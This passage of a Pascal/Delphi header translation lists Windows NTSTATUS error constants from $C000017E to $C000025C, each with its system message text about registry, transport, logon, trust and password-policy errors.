// MessageId: STATUS_TOO_MANY_SIDS
//
// MessageText:
//
// Too many Sids have been specified.
//
STATUS_TOO_MANY_SIDS             = NTSTATUS($C000017E);

//
// MessageId: STATUS_LM_CROSS_ENCRYPTION_REQUIRED
//
// MessageText:
//
// An attempt was made to change a user password in the security account manager without providing the necessary LM cross-encrypted password.
//
STATUS_LM_CROSS_ENCRYPTION_REQUIRED = NTSTATUS($C000017F);

//
// MessageId: STATUS_KEY_HAS_CHILDREN
//
// MessageText:
//
// An attempt was made to create a symbolic link in a registry key that already has subkeys or values.
//
STATUS_KEY_HAS_CHILDREN          = NTSTATUS($C0000180);

//
// MessageId: STATUS_CHILD_MUST_BE_VOLATILE
//
// MessageText:
//
// An attempt was made to create a Stable subkey under a Volatile parent key.
//
STATUS_CHILD_MUST_BE_VOLATILE    = NTSTATUS($C0000181);

//
// MessageId: STATUS_DEVICE_CONFIGURATION_ERROR
//
// MessageText:
//
// The I/O device is configured incorrectly or the configuration parameters to the driver are incorrect.
//
STATUS_DEVICE_CONFIGURATION_ERROR = NTSTATUS($C0000182);

//
// MessageId: STATUS_DRIVER_INTERNAL_ERROR
//
// MessageText:
//
// An error was detected between two drivers or within an I/O driver.
//
STATUS_DRIVER_INTERNAL_ERROR     = NTSTATUS($C0000183);

//
// MessageId: STATUS_INVALID_DEVICE_STATE
//
// MessageText:
//
// The device is not in a valid state to perform this request.
//
STATUS_INVALID_DEVICE_STATE      = NTSTATUS($C0000184);

//
// MessageId: STATUS_IO_DEVICE_ERROR
//
// MessageText:
//
// The I/O device reported an I/O error.
//
STATUS_IO_DEVICE_ERROR           = NTSTATUS($C0000185);

//
// MessageId: STATUS_DEVICE_PROTOCOL_ERROR
//
// MessageText:
//
// A protocol error was detected between the driver and the device.
//
STATUS_DEVICE_PROTOCOL_ERROR     = NTSTATUS($C0000186);

//
// MessageId: STATUS_BACKUP_CONTROLLER
//
// MessageText:
//
// This operation is only allowed for the Primary Domain Controller of the domain.
//
STATUS_BACKUP_CONTROLLER         = NTSTATUS($C0000187);

//
// MessageId: STATUS_LOG_FILE_FULL
//
// MessageText:
//
// Log file space is insufficient to support this operation.
//
STATUS_LOG_FILE_FULL             = NTSTATUS($C0000188);

//
// MessageId: STATUS_TOO_LATE
//
// MessageText:
//
// A write operation was attempted to a volume after it was dismounted.
//
STATUS_TOO_LATE                  = NTSTATUS($C0000189);

//
// MessageId: STATUS_NO_TRUST_LSA_SECRET
//
// MessageText:
//
// The workstation does not have a trust secret for the primary domain in the local LSA database.
//
STATUS_NO_TRUST_LSA_SECRET       = NTSTATUS($C000018A);

//
// MessageId: STATUS_NO_TRUST_SAM_ACCOUNT
//
// MessageText:
//
// The SAM database on the Windows Server does not have a computer account for this workstation trust relationship.
//
STATUS_NO_TRUST_SAM_ACCOUNT      = NTSTATUS($C000018B);

//
// MessageId: STATUS_TRUSTED_DOMAIN_FAILURE
//
// MessageText:
//
// The logon request failed because the trust relationship between the primary domain and the trusted domain failed.
//
STATUS_TRUSTED_DOMAIN_FAILURE    = NTSTATUS($C000018C);

//
// MessageId: STATUS_TRUSTED_RELATIONSHIP_FAILURE
//
// MessageText:
//
// The logon request failed because the trust relationship between this workstation and the primary domain failed.
//
STATUS_TRUSTED_RELATIONSHIP_FAILURE = NTSTATUS($C000018D);

//
// MessageId: STATUS_EVENTLOG_FILE_CORRUPT
//
// MessageText:
//
// The Eventlog log file is corrupt.
//
STATUS_EVENTLOG_FILE_CORRUPT     = NTSTATUS($C000018E);

//
// MessageId: STATUS_EVENTLOG_CANT_START
//
// MessageText:
//
// No Eventlog log file could be opened. The Eventlog service did not start.
//
STATUS_EVENTLOG_CANT_START       = NTSTATUS($C000018F);

//
// MessageId: STATUS_TRUST_FAILURE
//
// MessageText:
//
// The network logon failed. This may be because the validation authority can't be reached.
//
STATUS_TRUST_FAILURE             = NTSTATUS($C0000190);

//
// MessageId: STATUS_MUTANT_LIMIT_EXCEEDED
//
// MessageText:
//
// An attempt was made to acquire a mutant such that its maximum count would have been exceeded.
//
STATUS_MUTANT_LIMIT_EXCEEDED     = NTSTATUS($C0000191);

//
// MessageId: STATUS_NETLOGON_NOT_STARTED
//
// MessageText:
//
// An attempt was made to logon, but the netlogon service was not started.
//
STATUS_NETLOGON_NOT_STARTED      = NTSTATUS($C0000192);

//
// MessageId: STATUS_ACCOUNT_EXPIRED
//
// MessageText:
//
// The user's account has expired.
//
STATUS_ACCOUNT_EXPIRED           = NTSTATUS($C0000193);    // ntsubauth

//
// MessageId: STATUS_POSSIBLE_DEADLOCK
//
// MessageText:
//
// {EXCEPTION}
// Possible deadlock condition.
//
STATUS_POSSIBLE_DEADLOCK         = NTSTATUS($C0000194);

//
// MessageId: STATUS_NETWORK_CREDENTIAL_CONFLICT
//
// MessageText:
//
// Multiple connections to a server or shared resource by the same user, using more than one user name, are not allowed. Disconnect all previous connections to the server or shared resource and try again.
//
STATUS_NETWORK_CREDENTIAL_CONFLICT = NTSTATUS($C0000195);

//
// MessageId: STATUS_REMOTE_SESSION_LIMIT
//
// MessageText:
//
// An attempt was made to establish a session to a network server, but there are already too many sessions established to that server.
//
STATUS_REMOTE_SESSION_LIMIT      = NTSTATUS($C0000196);

//
// MessageId: STATUS_EVENTLOG_FILE_CHANGED
//
// MessageText:
//
// The log file has changed between reads.
//
STATUS_EVENTLOG_FILE_CHANGED     = NTSTATUS($C0000197);

//
// MessageId: STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT
//
// MessageText:
//
// The account used is an Interdomain Trust account. Use your global user account or local user account to access this server.
//
STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT = NTSTATUS($C0000198);

//
// MessageId: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
//
// MessageText:
//
// The account used is a Computer Account. Use your global user account or local user account to access this server.
//
STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT = NTSTATUS($C0000199);

//
// MessageId: STATUS_NOLOGON_SERVER_TRUST_ACCOUNT
//
// MessageText:
//
// The account used is an Server Trust account. Use your global user account or local user account to access this server.
//
STATUS_NOLOGON_SERVER_TRUST_ACCOUNT = NTSTATUS($C000019A);

//
// MessageId: STATUS_DOMAIN_TRUST_INCONSISTENT
//
// MessageText:
//
// The name or SID of the domain specified is inconsistent with the trust information for that domain.
//
STATUS_DOMAIN_TRUST_INCONSISTENT = NTSTATUS($C000019B);

//
// MessageId: STATUS_FS_DRIVER_REQUIRED
//
// MessageText:
//
// A volume has been accessed for which a file system driver is required that has not yet been loaded.
//
STATUS_FS_DRIVER_REQUIRED        = NTSTATUS($C000019C);

//
// MessageId: STATUS_IMAGE_ALREADY_LOADED_AS_DLL
//
// MessageText:
//
// Indicates that the specified image is already loaded as a DLL.
//
STATUS_IMAGE_ALREADY_LOADED_AS_DLL = NTSTATUS($C000019D);

//
// MessageId: STATUS_INCOMPATIBLE_WITH_GLOBAL_SHORT_NAME_REGISTRY_SETTING
//
// MessageText:
//
// Short name settings may not be changed on this volume due to the global registry setting.
//
STATUS_INCOMPATIBLE_WITH_GLOBAL_SHORT_NAME_REGISTRY_SETTING = NTSTATUS($C000019E);

//
// MessageId: STATUS_SHORT_NAMES_NOT_ENABLED_ON_VOLUME
//
// MessageText:
//
// Short names are not enabled on this volume.
//
STATUS_SHORT_NAMES_NOT_ENABLED_ON_VOLUME = NTSTATUS($C000019F);

//
// MessageId: STATUS_SECURITY_STREAM_IS_INCONSISTENT
//
// MessageText:
//
// The security stream for the given volume is in an inconsistent state.
// Please run CHKDSK on the volume.
//
STATUS_SECURITY_STREAM_IS_INCONSISTENT = NTSTATUS($C00001A0);

//
// MessageId: STATUS_INVALID_LOCK_RANGE
//
// MessageText:
//
// A requested file lock operation cannot be processed due to an invalid byte range.
//
STATUS_INVALID_LOCK_RANGE        = NTSTATUS($C00001A1);

//
// MessageId: STATUS_INVALID_ACE_CONDITION
//
// MessageText:
//
// {Invalid ACE Condition}
// The specified access control entry (ACE) contains an invalid condition.
//
STATUS_INVALID_ACE_CONDITION     = NTSTATUS($C00001A2);

//
// MessageId: STATUS_IMAGE_SUBSYSTEM_NOT_PRESENT
//
// MessageText:
//
// The subsystem needed to support the image type is not present.
//
STATUS_IMAGE_SUBSYSTEM_NOT_PRESENT = NTSTATUS($C00001A3);

//
// MessageId: STATUS_NOTIFICATION_GUID_ALREADY_DEFINED
//
// MessageText:
//
// {Invalid ACE Condition}
// The specified file already has a notification GUID associated with it.
//
STATUS_NOTIFICATION_GUID_ALREADY_DEFINED = NTSTATUS($C00001A4);

//
// MessageId: STATUS_INVALID_EXCEPTION_HANDLER
//
// MessageText:
//
// An invalid exception handler routine has been detected.
//
STATUS_INVALID_EXCEPTION_HANDLER = NTSTATUS($C00001A5);

//
// MessageId: STATUS_DUPLICATE_PRIVILEGES
//
// MessageText:
//
// Duplicate privileges were specified for the token.
//
STATUS_DUPLICATE_PRIVILEGES      = NTSTATUS($C00001A6);

//
// MessageId: STATUS_NOT_ALLOWED_ON_SYSTEM_FILE
//
// MessageText:
//
// Requested action not allowed on a file system internal file.
//
STATUS_NOT_ALLOWED_ON_SYSTEM_FILE = NTSTATUS($C00001A7);

//
// MessageId: STATUS_REPAIR_NEEDED
//
// MessageText:
//
// A portion of the file system requires repair.
//
STATUS_REPAIR_NEEDED             = NTSTATUS($C00001A8);

//
// MessageId: STATUS_QUOTA_NOT_ENABLED
//
// MessageText:
//
// Quota support is not enabled on the system.
//
STATUS_QUOTA_NOT_ENABLED         = NTSTATUS($C00001A9);

//
// MessageId: STATUS_NO_APPLICATION_PACKAGE
//
// MessageText:
//
// The operation failed because the application is not part of an application package.
//
STATUS_NO_APPLICATION_PACKAGE    = NTSTATUS($C00001AA);

//
// MessageId: STATUS_FILE_METADATA_OPTIMIZATION_IN_PROGRESS
//
// MessageText:
//
// File metadata optimization is already in progress.
//
STATUS_FILE_METADATA_OPTIMIZATION_IN_PROGRESS = NTSTATUS($C00001AB);

//
// MessageId: STATUS_NOT_SAME_OBJECT
//
// MessageText:
//
// The objects are not identical.
//
STATUS_NOT_SAME_OBJECT           = NTSTATUS($C00001AC);

//
// MessageId: STATUS_FATAL_MEMORY_EXHAUSTION
//
// MessageText:
//
// The process has terminated because it could not allocate additional memory.
//
STATUS_FATAL_MEMORY_EXHAUSTION   = NTSTATUS($C00001AD);

//
// MessageId: STATUS_ERROR_PROCESS_NOT_IN_JOB
//
// MessageText:
//
// The process is not part of a job.
//
STATUS_ERROR_PROCESS_NOT_IN_JOB  = NTSTATUS($C00001AE);

//
// MessageId: STATUS_CPU_SET_INVALID
//
// MessageText:
//
// The specified CPU Set IDs are invalid.
//
STATUS_CPU_SET_INVALID           = NTSTATUS($C00001AF);

//
// MessageId: STATUS_IO_DEVICE_INVALID_DATA
//
// MessageText:
//
// The device reported an invalid data error.
//
STATUS_IO_DEVICE_INVALID_DATA    = NTSTATUS($C00001B0);

//
// MessageId: STATUS_IO_UNALIGNED_WRITE
//
// MessageText:
//
// The device reported an unaligned write error.
//
STATUS_IO_UNALIGNED_WRITE        = NTSTATUS($C00001B1);

//
// MessageId: STATUS_CONTROL_STACK_VIOLATION
//
// MessageText:
//
// An invalid address was found on the control flow stack.
//
STATUS_CONTROL_STACK_VIOLATION   = NTSTATUS($C00001B2);    //winnt

//
//  Available range of NTSTATUS codes
//
//
// MessageId: STATUS_NETWORK_OPEN_RESTRICTION
//
// MessageText:
//
// A remote open failed because the network open restrictions were not satisfied.
//
STATUS_NETWORK_OPEN_RESTRICTION  = NTSTATUS($C0000201);

//
// MessageId: STATUS_NO_USER_SESSION_KEY
//
// MessageText:
//
// There is no user session key for the specified logon session.
//
STATUS_NO_USER_SESSION_KEY       = NTSTATUS($C0000202);

//
// MessageId: STATUS_USER_SESSION_DELETED
//
// MessageText:
//
// The remote user session has been deleted.
//
STATUS_USER_SESSION_DELETED      = NTSTATUS($C0000203);

//
// MessageId: STATUS_RESOURCE_LANG_NOT_FOUND
//
// MessageText:
//
// Indicates the specified resource language ID cannot be found in the
// image file.
//
STATUS_RESOURCE_LANG_NOT_FOUND   = NTSTATUS($C0000204);

//
// MessageId: STATUS_INSUFF_SERVER_RESOURCES
//
// MessageText:
//
// Insufficient server resources exist to complete the request.
//
STATUS_INSUFF_SERVER_RESOURCES   = NTSTATUS($C0000205);

//
// MessageId: STATUS_INVALID_BUFFER_SIZE
//
// MessageText:
//
// The size of the buffer is invalid for the specified operation.
//
STATUS_INVALID_BUFFER_SIZE       = NTSTATUS($C0000206);

//
// MessageId: STATUS_INVALID_ADDRESS_COMPONENT
//
// MessageText:
//
// The transport rejected the network address specified as invalid.
//
STATUS_INVALID_ADDRESS_COMPONENT = NTSTATUS($C0000207);

//
// MessageId: STATUS_INVALID_ADDRESS_WILDCARD
//
// MessageText:
//
// The transport rejected the network address specified due to an invalid use of a wildcard.
//
STATUS_INVALID_ADDRESS_WILDCARD  = NTSTATUS($C0000208);

//
// MessageId: STATUS_TOO_MANY_ADDRESSES
//
// MessageText:
//
// The transport address could not be opened because all the available addresses are in use.
//
STATUS_TOO_MANY_ADDRESSES        = NTSTATUS($C0000209);

//
// MessageId: STATUS_ADDRESS_ALREADY_EXISTS
//
// MessageText:
//
// The transport address could not be opened because it already exists.
//
STATUS_ADDRESS_ALREADY_EXISTS    = NTSTATUS($C000020A);

//
// MessageId: STATUS_ADDRESS_CLOSED
//
// MessageText:
//
// The transport address is now closed.
//
STATUS_ADDRESS_CLOSED            = NTSTATUS($C000020B);

//
// MessageId: STATUS_CONNECTION_DISCONNECTED
//
// MessageText:
//
// The transport connection is now disconnected.
//
STATUS_CONNECTION_DISCONNECTED   = NTSTATUS($C000020C);

//
// MessageId: STATUS_CONNECTION_RESET
//
// MessageText:
//
// The transport connection has been reset.
//
STATUS_CONNECTION_RESET          = NTSTATUS($C000020D);

//
// MessageId: STATUS_TOO_MANY_NODES
//
// MessageText:
//
// The transport cannot dynamically acquire any more nodes.
//
STATUS_TOO_MANY_NODES            = NTSTATUS($C000020E);

//
// MessageId: STATUS_TRANSACTION_ABORTED
//
// MessageText:
//
// The transport aborted a pending transaction.
//
STATUS_TRANSACTION_ABORTED       = NTSTATUS($C000020F);

//
// MessageId: STATUS_TRANSACTION_TIMED_OUT
//
// MessageText:
//
// The transport timed out a request waiting for a response.
//
STATUS_TRANSACTION_TIMED_OUT     = NTSTATUS($C0000210);

//
// MessageId: STATUS_TRANSACTION_NO_RELEASE
//
// MessageText:
//
// The transport did not receive a release for a pending response.
//
STATUS_TRANSACTION_NO_RELEASE    = NTSTATUS($C0000211);

//
// MessageId: STATUS_TRANSACTION_NO_MATCH
//
// MessageText:
//
// The transport did not find a transaction matching the specific token.
//
STATUS_TRANSACTION_NO_MATCH      = NTSTATUS($C0000212);

//
// MessageId: STATUS_TRANSACTION_RESPONDED
//
// MessageText:
//
// The transport had previously responded to a transaction request.
//
STATUS_TRANSACTION_RESPONDED     = NTSTATUS($C0000213);

//
// MessageId: STATUS_TRANSACTION_INVALID_ID
//
// MessageText:
//
// The transport does not recognized the transaction request identifier specified.
//
STATUS_TRANSACTION_INVALID_ID    = NTSTATUS($C0000214);

//
// MessageId: STATUS_TRANSACTION_INVALID_TYPE
//
// MessageText:
//
// The transport does not recognize the transaction request type specified.
//
STATUS_TRANSACTION_INVALID_TYPE  = NTSTATUS($C0000215);

//
// MessageId: STATUS_NOT_SERVER_SESSION
//
// MessageText:
//
// The transport can only process the specified request on the server side of a session.
//
STATUS_NOT_SERVER_SESSION        = NTSTATUS($C0000216);

//
// MessageId: STATUS_NOT_CLIENT_SESSION
//
// MessageText:
//
// The transport can only process the specified request on the client side of a session.
//
STATUS_NOT_CLIENT_SESSION        = NTSTATUS($C0000217);

//
// MessageId: STATUS_CANNOT_LOAD_REGISTRY_FILE
//
// MessageText:
//
// {Registry File Failure}
// The registry cannot load the hive (file):
// %hs
// or its log or alternate.
// It is corrupt, absent, or not writable.
//
STATUS_CANNOT_LOAD_REGISTRY_FILE = NTSTATUS($C0000218);

//
// MessageId: STATUS_DEBUG_ATTACH_FAILED
//
// MessageText:
//
// {Unexpected Failure in DebugActiveProcess}
// An unexpected failure occurred while processing a DebugActiveProcess API request. You may choose OK to terminate the process, or Cancel to ignore the error.
//
STATUS_DEBUG_ATTACH_FAILED       = NTSTATUS($C0000219);

//
// MessageId: STATUS_SYSTEM_PROCESS_TERMINATED
//
// MessageText:
//
// {Fatal System Error}
// The %hs system process terminated unexpectedly with a status of 0x%08x (0x%08x 0x%08x).
// The system has been shut down.
//
STATUS_SYSTEM_PROCESS_TERMINATED = NTSTATUS($C000021A);

//
// MessageId: STATUS_DATA_NOT_ACCEPTED
//
// MessageText:
//
// {Data Not Accepted}
// The TDI client could not handle the data received during an indication.
//
STATUS_DATA_NOT_ACCEPTED         = NTSTATUS($C000021B);

//
// MessageId: STATUS_NO_BROWSER_SERVERS_FOUND
//
// MessageText:
//
// {Unable to Retrieve Browser Server List}
// The list of servers for this workgroup is not currently available.
//
STATUS_NO_BROWSER_SERVERS_FOUND  = NTSTATUS($C000021C);

//
// MessageId: STATUS_VDM_HARD_ERROR
//
// MessageText:
//
// NTVDM encountered a hard error.
//
STATUS_VDM_HARD_ERROR            = NTSTATUS($C000021D);

//
// MessageId: STATUS_DRIVER_CANCEL_TIMEOUT
//
// MessageText:
//
// {Cancel Timeout}
// The driver %hs failed to complete a cancelled I/O request in the allotted time.
//
STATUS_DRIVER_CANCEL_TIMEOUT     = NTSTATUS($C000021E);

//
// MessageId: STATUS_REPLY_MESSAGE_MISMATCH
//
// MessageText:
//
// {Reply Message Mismatch}
// An attempt was made to reply to an LPC message, but the thread specified by the client ID in the message was not waiting on that message.
//
STATUS_REPLY_MESSAGE_MISMATCH    = NTSTATUS($C000021F);

//
// MessageId: STATUS_MAPPED_ALIGNMENT
//
// MessageText:
//
// {Mapped View Alignment Incorrect}
// An attempt was made to map a view of a file, but either the specified base address or the offset into the file were not aligned on the proper allocation granularity.
//
STATUS_MAPPED_ALIGNMENT          = NTSTATUS($C0000220);

//
// MessageId: STATUS_IMAGE_CHECKSUM_MISMATCH
//
// MessageText:
//
// {Bad Image Checksum}
// The image %hs is possibly corrupt. The header checksum does not match the computed checksum.
//
STATUS_IMAGE_CHECKSUM_MISMATCH   = NTSTATUS($C0000221);

//
// MessageId: STATUS_LOST_WRITEBEHIND_DATA
//
// MessageText:
//
// {Delayed Write Failed}
// Windows was unable to save all the data for the file %hs. The data has been lost. This error may be caused by a failure of your computer hardware or network connection. Please try to save this file elsewhere.
//
STATUS_LOST_WRITEBEHIND_DATA     = NTSTATUS($C0000222);

//
// MessageId: STATUS_CLIENT_SERVER_PARAMETERS_INVALID
//
// MessageText:
//
// The parameter(s) passed to the server in the client/server shared memory window were invalid. Too much data may have been put in the shared memory window.
//
STATUS_CLIENT_SERVER_PARAMETERS_INVALID = NTSTATUS($C0000223);

//
// MessageId: STATUS_PASSWORD_MUST_CHANGE
//
// MessageText:
//
// The user's password must be changed before signing in.
//
STATUS_PASSWORD_MUST_CHANGE      = NTSTATUS($C0000224);    // ntsubauth

//
// MessageId: STATUS_NOT_FOUND
//
// MessageText:
//
// The object was not found.
//
STATUS_NOT_FOUND                 = NTSTATUS($C0000225);

//
// MessageId: STATUS_NOT_TINY_STREAM
//
// MessageText:
//
// The stream is not a tiny stream.
//
STATUS_NOT_TINY_STREAM           = NTSTATUS($C0000226);

//
// MessageId: STATUS_RECOVERY_FAILURE
//
// MessageText:
//
// A transaction recover failed.
//
STATUS_RECOVERY_FAILURE          = NTSTATUS($C0000227);

//
// MessageId: STATUS_STACK_OVERFLOW_READ
//
// MessageText:
//
// The request must be handled by the stack overflow code.
//
STATUS_STACK_OVERFLOW_READ       = NTSTATUS($C0000228);

//
// MessageId: STATUS_FAIL_CHECK
//
// MessageText:
//
// A consistency check failed.
//
STATUS_FAIL_CHECK                = NTSTATUS($C0000229);

//
// MessageId: STATUS_DUPLICATE_OBJECTID
//
// MessageText:
//
// The attempt to insert the ID in the index failed because the ID is already in the index.
//
STATUS_DUPLICATE_OBJECTID        = NTSTATUS($C000022A);

//
// MessageId: STATUS_OBJECTID_EXISTS
//
// MessageText:
//
// The attempt to set the object's ID failed because the object already has an ID.
//
STATUS_OBJECTID_EXISTS           = NTSTATUS($C000022B);

//
// MessageId: STATUS_CONVERT_TO_LARGE
//
// MessageText:
//
// Internal OFS status codes indicating how an allocation operation is handled. Either it is retried after the containing onode is moved or the extent stream is converted to a large stream.
//
STATUS_CONVERT_TO_LARGE          = NTSTATUS($C000022C);

//
// MessageId: STATUS_RETRY
//
// MessageText:
//
// The request needs to be retried.
//
STATUS_RETRY                     = NTSTATUS($C000022D);

//
// MessageId: STATUS_FOUND_OUT_OF_SCOPE
//
// MessageText:
//
// The attempt to find the object found an object matching by ID on the volume but it is out of the scope of the handle used for the operation.
//
STATUS_FOUND_OUT_OF_SCOPE        = NTSTATUS($C000022E);

//
// MessageId: STATUS_ALLOCATE_BUCKET
//
// MessageText:
//
// The bucket array must be grown. Retry transaction after doing so.
//
STATUS_ALLOCATE_BUCKET           = NTSTATUS($C000022F);

//
// MessageId: STATUS_PROPSET_NOT_FOUND
//
// MessageText:
//
// The property set specified does not exist on the object.
//
STATUS_PROPSET_NOT_FOUND         = NTSTATUS($C0000230);

//
// MessageId: STATUS_MARSHALL_OVERFLOW
//
// MessageText:
//
// The user/kernel marshalling buffer has overflowed.
//
STATUS_MARSHALL_OVERFLOW         = NTSTATUS($C0000231);

//
// MessageId: STATUS_INVALID_VARIANT
//
// MessageText:
//
// The supplied variant structure contains invalid data.
//
STATUS_INVALID_VARIANT           = NTSTATUS($C0000232);

//
// MessageId: STATUS_DOMAIN_CONTROLLER_NOT_FOUND
//
// MessageText:
//
// Could not find a domain controller for this domain.
//
STATUS_DOMAIN_CONTROLLER_NOT_FOUND = NTSTATUS($C0000233);

//
// MessageId: STATUS_ACCOUNT_LOCKED_OUT
//
// MessageText:
//
// The user account has been automatically locked because too many invalid logon attempts or password change attempts have been requested.
//
STATUS_ACCOUNT_LOCKED_OUT        = NTSTATUS($C0000234);    // ntsubauth

//
// MessageId: STATUS_HANDLE_NOT_CLOSABLE
//
// MessageText:
//
// NtClose was called on a handle that was protected from close via NtSetInformationObject.
//
STATUS_HANDLE_NOT_CLOSABLE       = NTSTATUS($C0000235);

//
// MessageId: STATUS_CONNECTION_REFUSED
//
// MessageText:
//
// The transport connection attempt was refused by the remote system.
//
STATUS_CONNECTION_REFUSED        = NTSTATUS($C0000236);

//
// MessageId: STATUS_GRACEFUL_DISCONNECT
//
// MessageText:
//
// The transport connection was gracefully closed.
//
STATUS_GRACEFUL_DISCONNECT       = NTSTATUS($C0000237);

//
// MessageId: STATUS_ADDRESS_ALREADY_ASSOCIATED
//
// MessageText:
//
// The transport endpoint already has an address associated with it.
//
STATUS_ADDRESS_ALREADY_ASSOCIATED = NTSTATUS($C0000238);

//
// MessageId: STATUS_ADDRESS_NOT_ASSOCIATED
//
// MessageText:
//
// An address has not yet been associated with the transport endpoint.
//
STATUS_ADDRESS_NOT_ASSOCIATED    = NTSTATUS($C0000239);

//
// MessageId: STATUS_CONNECTION_INVALID
//
// MessageText:
//
// An operation was attempted on a nonexistent transport connection.
//
STATUS_CONNECTION_INVALID        = NTSTATUS($C000023A);

//
// MessageId: STATUS_CONNECTION_ACTIVE
//
// MessageText:
//
// An invalid operation was attempted on an active transport connection.
//
STATUS_CONNECTION_ACTIVE         = NTSTATUS($C000023B);

//
// MessageId: STATUS_NETWORK_UNREACHABLE
//
// MessageText:
//
// The remote network is not reachable by the transport.
//
STATUS_NETWORK_UNREACHABLE       = NTSTATUS($C000023C);

//
// MessageId: STATUS_HOST_UNREACHABLE
//
// MessageText:
//
// The remote system is not reachable by the transport.
//
STATUS_HOST_UNREACHABLE          = NTSTATUS($C000023D);

//
// MessageId: STATUS_PROTOCOL_UNREACHABLE
//
// MessageText:
//
// The remote system does not support the transport protocol.
//
STATUS_PROTOCOL_UNREACHABLE      = NTSTATUS($C000023E);

//
// MessageId: STATUS_PORT_UNREACHABLE
//
// MessageText:
//
// No service is operating at the destination port of the transport on the remote system.
//
STATUS_PORT_UNREACHABLE          = NTSTATUS($C000023F);

//
// MessageId: STATUS_REQUEST_ABORTED
//
// MessageText:
//
// The request was aborted.
//
STATUS_REQUEST_ABORTED           = NTSTATUS($C0000240);

//
// MessageId: STATUS_CONNECTION_ABORTED
//
// MessageText:
//
// The transport connection was aborted by the local system.
//
STATUS_CONNECTION_ABORTED        = NTSTATUS($C0000241);

//
// MessageId: STATUS_BAD_COMPRESSION_BUFFER
//
// MessageText:
//
// The specified buffer contains ill-formed data.
//
STATUS_BAD_COMPRESSION_BUFFER    = NTSTATUS($C0000242);

//
// MessageId: STATUS_USER_MAPPED_FILE
//
// MessageText:
//
// The requested operation cannot be performed on a file with a user mapped section open.
//
STATUS_USER_MAPPED_FILE          = NTSTATUS($C0000243);

//
// MessageId: STATUS_AUDIT_FAILED
//
// MessageText:
//
// {Audit Failed}
// An attempt to generate a security audit failed.
//
STATUS_AUDIT_FAILED              = NTSTATUS($C0000244);

//
// MessageId: STATUS_TIMER_RESOLUTION_NOT_SET
//
// MessageText:
//
// The timer resolution was not previously set by the current process.
//
STATUS_TIMER_RESOLUTION_NOT_SET  = NTSTATUS($C0000245);

//
// MessageId: STATUS_CONNECTION_COUNT_LIMIT
//
// MessageText:
//
// A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.
//
STATUS_CONNECTION_COUNT_LIMIT    = NTSTATUS($C0000246);

//
// MessageId: STATUS_LOGIN_TIME_RESTRICTION
//
// MessageText:
//
// Attempting to login during an unauthorized time of day for this account.
//
STATUS_LOGIN_TIME_RESTRICTION    = NTSTATUS($C0000247);

//
// MessageId: STATUS_LOGIN_WKSTA_RESTRICTION
//
// MessageText:
//
// The account is not authorized to login from this station.
//
STATUS_LOGIN_WKSTA_RESTRICTION   = NTSTATUS($C0000248);

//
// MessageId: STATUS_IMAGE_MP_UP_MISMATCH
//
// MessageText:
//
// {UP/MP Image Mismatch}
// The image %hs has been modified for use on a uniprocessor system, but you are running it on a multiprocessor machine.
// Please reinstall the image file.
//
STATUS_IMAGE_MP_UP_MISMATCH      = NTSTATUS($C0000249);

//
// MessageId: STATUS_INSUFFICIENT_LOGON_INFO
//
// MessageText:
//
// There is insufficient account information to log you on.
//
STATUS_INSUFFICIENT_LOGON_INFO   = NTSTATUS($C0000250);

//
// MessageId: STATUS_BAD_DLL_ENTRYPOINT
//
// MessageText:
//
// {Invalid DLL Entrypoint}
// The dynamic link library %hs is not written correctly. The stack pointer has been left in an inconsistent state. The entrypoint should be declared as WINAPI or STDCALL. Select YES to fail the DLL load. Select NO to continue execution. Selecting NO may cause the application to operate incorrectly.
//
STATUS_BAD_DLL_ENTRYPOINT        = NTSTATUS($C0000251);

//
// MessageId: STATUS_BAD_SERVICE_ENTRYPOINT
//
// MessageText:
//
// {Invalid Service Callback Entrypoint}
// The %hs service is not written correctly. The stack pointer has been left in an inconsistent state. The callback entrypoint should be declared as WINAPI or STDCALL. Selecting OK will cause the service to continue operation. However, the service process may operate incorrectly.
//
STATUS_BAD_SERVICE_ENTRYPOINT    = NTSTATUS($C0000252);

//
// MessageId: STATUS_LPC_REPLY_LOST
//
// MessageText:
//
// The server received the messages but did not send a reply.
//
STATUS_LPC_REPLY_LOST            = NTSTATUS($C0000253);

//
// MessageId: STATUS_IP_ADDRESS_CONFLICT1
//
// MessageText:
//
// There is an IP address conflict with another system on the network
//
STATUS_IP_ADDRESS_CONFLICT1      = NTSTATUS($C0000254);

//
// MessageId: STATUS_IP_ADDRESS_CONFLICT2
//
// MessageText:
//
// There is an IP address conflict with another system on the network
//
STATUS_IP_ADDRESS_CONFLICT2      = NTSTATUS($C0000255);

//
// MessageId: STATUS_REGISTRY_QUOTA_LIMIT
//
// MessageText:
//
// {Low On Registry Space}
// The system has reached the maximum size allowed for the system part of the registry. Additional storage requests will be ignored.
//
STATUS_REGISTRY_QUOTA_LIMIT      = NTSTATUS($C0000256);

//
// MessageId: STATUS_PATH_NOT_COVERED
//
// MessageText:
//
// The contacted server does not support the indicated part of the DFS namespace.
//
STATUS_PATH_NOT_COVERED          = NTSTATUS($C0000257);

//
// MessageId: STATUS_NO_CALLBACK_ACTIVE
//
// MessageText:
//
// A callback return system service cannot be executed when no callback is active.
//
STATUS_NO_CALLBACK_ACTIVE        = NTSTATUS($C0000258);

//
// MessageId: STATUS_LICENSE_QUOTA_EXCEEDED
//
// MessageText:
//
// The service being accessed is licensed for a particular number of connections. No more connections can be made to the service at this time because there are already as many connections as the service can accept.
//
STATUS_LICENSE_QUOTA_EXCEEDED    = NTSTATUS($C0000259);

//
// MessageId: STATUS_PWD_TOO_SHORT
//
// MessageText:
//
// The password provided is too short to meet the policy of your user account. Please choose a longer password.
//
STATUS_PWD_TOO_SHORT             = NTSTATUS($C000025A);

//
// MessageId: STATUS_PWD_TOO_RECENT
//
// MessageText:
//
// The policy of your user account does not allow you to change passwords too frequently. This is done to prevent users from changing back to a familiar, but potentially discovered, password. If you feel your password has been compromised then please contact your administrator immediately to have a new one assigned.
//
STATUS_PWD_TOO_RECENT            = NTSTATUS($C000025B);

//
// MessageId: STATUS_PWD_HISTORY_CONFLICT
//
// MessageText:
//
// You have attempted to change your password to one that you have used in the past. The policy of your user account does not allow this. Please select a password that you have not previously used.
//
STATUS_PWD_HISTORY_CONFLICT      = NTSTATUS($C000025C);

//
// MessageId: STATUS_PLUGPLAY_NO_DEVICE
//
// MessageText:
//
// You have attempted to load a legacy device driver while its device instance had been disabled.
//
